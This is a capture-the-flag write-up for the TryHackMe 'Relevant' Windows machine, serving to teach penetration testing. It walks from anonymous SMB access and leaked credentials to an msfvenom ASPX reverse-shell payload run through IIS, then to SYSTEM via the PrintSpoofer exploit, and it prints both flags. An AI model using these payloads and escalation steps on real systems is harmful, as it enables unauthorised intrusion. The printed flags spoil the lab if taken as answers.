---
layout: single
title: Relevant - TryHackMe
excerpt: "You have been assigned to a client that wants a penetration test conducted on an environment due to be released to production in seven days. The client requests that an engineer conducts an assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test).  The client has asked that you secure two flags (no location provided) as proof of exploitation."
date: 2022-12-09
classes: wide
header:
  teaser: /assets/images/thm-writeup-relevant/relevant.png
  teaser_home_page: true
  icon: /assets/images/thm.png
categories:
  - tryhackme
tags:
  - Windows
  - IIS
  - privileged
  - msfvenom
---

![](/assets/images/thm-writeup-relevant/relevant1.PNG)

You have been assigned to a client that wants a penetration test conducted on an environment due to be released to production in seven days. The client requests that an engineer conducts an assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test).  The client has asked that you secure two flags (no location provided) as proof of exploitation.

## Portscan

```
nmap -sCV -p80,135,139,445,3389,49663,49667,49669 10.10.254.100
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-09 06:31 EST
Nmap scan report for 10.10.254.100     
Host is up (0.047s latency).
                                                          
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server              
|_http-server-header: Microsoft-IIS/10.0
| http-methods:                                                                                                      
|_  Potentially risky methods: TRACE                                                                                 
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=Relevant
| Not valid before: 2022-12-08T11:23:33
|_Not valid after:  2023-06-09T11:23:33
|_ssl-date: 2022-12-09T11:33:07+00:00; +1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2022-12-09T11:32:27+00:00
49663/tcp open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h36m01s, deviation: 3h34m41s, median: 0s
| smb2-time: 
|   date: 2022-12-09T11:32:30
|_  start_date: 2022-12-09T11:23:49
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-12-09T03:32:31-08:00
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
```

## SMB

The target host on port 445 and 139 runs a SMB Server, we can list the content, cause the smb server has anonymous user enabled.

![](/assets/images/thm-writeup-relevant/smblist.PNG)

We find a shared folder called nt4wrksv that we can access anonymously.

![](/assets/images/thm-writeup-relevant/smbpasswords.PNG)

Checking the content of passwords.txt file we can see 2 base64 encoded passwords, if we decode them, we get a pair of usernames and passwords.

![](/assets/images/thm-writeup-relevant/smbdecoded.PNG)

If we try to acces the machine with this credentials, we realize that they are not valid. At this point we need to start looking for another attack vector.

## Web

Checking the nmap scan, we can see that the machine is hosting a web server on port's 80 and 49663, that we can access.

![](/assets/images/thm-writeup-relevant/default.PNG)

Both ports have the default IIS template, we can use a subdirectory enummeration tool like ffuf,wfuzz or gobuster in order to discover new files on the server.

`ffuf  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://X.X:X.X:49663/FUZZ -mc 200,301,303`

![](/assets/images/thm-writeup-relevant/ffuf.PNG)

The subdirectory name in IIS, is the same as the shared resource in the smb server, they may be the same, so let's try to upload something into the smb folder and browse it in IIS.

![](/assets/images/thm-writeup-relevant/hellotxt.PNG)

As we can see below, we can acces the file that we just added into the SMB folder, this means that we can upload and execute files in the webserver.

![](/assets/images/thm-writeup-relevant/iistxt.PNG)

## Exploitation

IIS uses .asp and .aspx shell files to execute scripts, so im going to create a reverse shell payload with msfvenom in order to gain acces to the machine.

`sudo msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOURIP LPORT=LOCALPORT -f aspx -o reverse.aspx`

![](/assets/images/thm-writeup-relevant/msfvenom.PNG)

Once we have the payload in the SMB folder we can start a netcat listener and execute the reverse.aspx file on the web browser, and we retrive the reverse shell.\ 
I used curl for this, but you can use your web browser.

`curl -X GET http://10.10.36.237:49663/nt4wrksv/reverse.aspx`

![](/assets/images/thm-writeup-relevant/netcat.PNG)

We can now go to Bob's desktop and retrive the user.txt 

![](/assets/images/thm-writeup-relevant/flag.PNG)

`user.txt: THM{fdk4ka34vk346ksxfr21tg789ktf45}`

## Priv Esc

Now we have a shell in the machine, but we are not a privileged, our goal is to reach system user, so we need to find a way of scalate privileges. There are several ways of doing this, I will sow you the coolest one.

First of all, let's check our privileges as "apppool\defaultapppool" service account user. We can see that SeImpersonatePrivilege is enabled.

![](/assets/images/thm-writeup-relevant/priv.PNG)

If we search at [Hacktricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens#seimpersonateprivilege-3.1.1) we find 3 ways of exploting this privilege, juicy-potato, RogueWinRM (needs winrm disabled), SweetPotato and PrintSpoofer. 

Im going to use the PrintSpoofer [exploit](https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0)

As we did with the .aspx file, upload the exploit in the smb folder.
Once we uploaded the exploit we can use dir to find it.

![](/assets/images/thm-writeup-relevant/dir.PNG)

The last step is to execute the exploit, in my case I will use `PrintSpoofer64.exe -i -c cmd` to spawn a system shell.

![](/assets/images/thm-writeup-relevant/execute.PNG)

Now we are executing commands as "nt\authority system", navigate to Administrator Desktop to retrive the root.txt

![](/assets/images/thm-writeup-relevant/root.PNG)

`root:THM{1fk5kf469devly1gl320zafgl345pv}`